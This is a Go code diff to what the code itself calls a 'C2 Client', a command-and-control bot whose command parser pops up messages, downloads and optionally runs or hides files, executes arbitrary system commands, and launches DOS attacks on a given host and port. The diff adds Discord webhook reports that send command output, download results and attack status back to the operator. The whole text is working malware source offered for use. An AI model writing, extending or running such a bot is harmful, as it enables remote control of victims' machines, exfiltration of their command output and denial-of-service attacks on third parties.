@@ -360,6 +360,7 @@ func ParseCommand(command string) error {
 			if len(parts) > 1 {
 				message := strings.Join(parts[1:], " ")
 				displayMessageInHTML(message)
+				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf(" Pop-up message sent:\n```\n%s\n```", message))
 			}
 		case "download":
 			if len(parts) >= 3 {
@@ -378,20 +379,20 @@ func ParseCommand(command string) error {
 				}
 
 				err := downloadFile(url, filename, run, hide)
+				status := " Success"
 				if err != nil {
-					return err
+					status = fmt.Sprintf(" Failed: %v", err)
 				}
-			} else {
-				return nil
+				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf(" Download `%s` from `%s`\nStatus: `%s`", filename, url, status))
 			}
 		case "cmd":
 			if len(parts) > 1 {
-				_, err := executeSystemCommand(parts[1], parts[2:])
+				output, err := executeSystemCommand(parts[1], parts[2:])
+				status := " Success"
 				if err != nil {
-					return err
+					status = fmt.Sprintf(" Error: %v", err)
 				}
-			} else {
-				return nil
+				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf(" Command `%s` executed\nOutput:\n```\n%s\n```Status: `%s`", strings.Join(parts[1:], " "), output, status))
 			}
 		case "dos":
 			if len(parts) < 4 {
@@ -403,10 +404,12 @@ func ParseCommand(command string) error {
 
 				duration, err := time.ParseDuration(durationStr)
 				if err != nil {
-					return nil
+					SendDiscordWebhook(config.WebhookURL, fmt.Sprintf(" Invalid duration format: `%s`", durationStr))
+					continue
 				}
-
+		 		SendDiscordWebhook(config.WebhookURL, fmt.Sprintf(" Starting DOS attack on `%s:%s` for `%s`...", target, port, durationStr))
 				DOS(target, port, duration)
+				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf(" DOS attack completed on `%s:%s`", target, port))
 			}
 		default:
 			if strings.HasPrefix(cmd, "dos ") {
@@ -422,10 +425,14 @@ func ParseCommand(command string) error {
 
 				duration, err := time.ParseDuration(durationStr + "s")
 				if err != nil {
-					return nil
+					SendDiscordWebhook(config.WebhookURL, fmt.Sprintf(" Invalid duration format: `%ss`", durationStr))
+					continue
 				}
 
+				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf(" Starting DOS attack on `%s:%s` for `%ss`...", target, port, durationStr))
 				DOS(target, port, duration)
+				SendDiscordWebhook(config.WebhookURL, fmt.Sprintf(" DOS attack completed on `%s:%s`", target, port))
+
 			}
 		}
 
@@ -443,6 +450,8 @@ func main() {
 		os.Exit(1)
 	}
 
+	SendDiscordWebhook(config.WebhookURL, " C2 Client started successfully.")
+	
 	for {
 		command, err := FetchCommand(config)
 		if err != nil {
